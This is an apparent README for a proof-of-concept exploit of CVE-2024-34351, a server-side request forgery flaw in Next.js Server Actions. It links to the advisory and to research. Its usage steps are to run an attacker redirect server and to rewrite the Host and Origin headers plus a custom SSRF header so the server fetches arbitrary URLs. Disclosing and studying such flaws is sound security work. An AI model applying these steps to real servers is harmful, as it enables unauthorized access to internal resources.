# CVE-2024-34351 Exploit

- [CVE-2024-34351 PoC](https://github.com/azu/nextjs-CVE-2024-34351/)
- [Next.js Server-Side Request Forgery in Server Actions · CVE-2024-34351 · GitHub Advisory Database](https://github.com/advisories/GHSA-fr5h-rqp8-mj6g)
- [Digging for SSRF in NextJS apps](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps)

## Summary

PoC for a full exploitation of NextJS SSRF. An attacker can get any website content from Next.js server using CVE-2024-34351 vulnerability.
This vulnerability is fixed in `next@14.1.1`.

## Usage

- Prepare a redirect server.
    - TypeScript
        ```
        deno run --allow-net --allow-read attacker-server.ts
        ```
    - Python
        ```
        python3 attacker-server.py
        ```
- Modify `Host` header to attacker server. (e.g. Host: 192.198.0.144:8000)
- Modify `Origin` header to attacker server. (e.g. Origin: http://192.198.0.144:8000/)
- Add a new header called `SSRF` to specify where to redirect to. (e.g. SSRF: http://example.com/test)
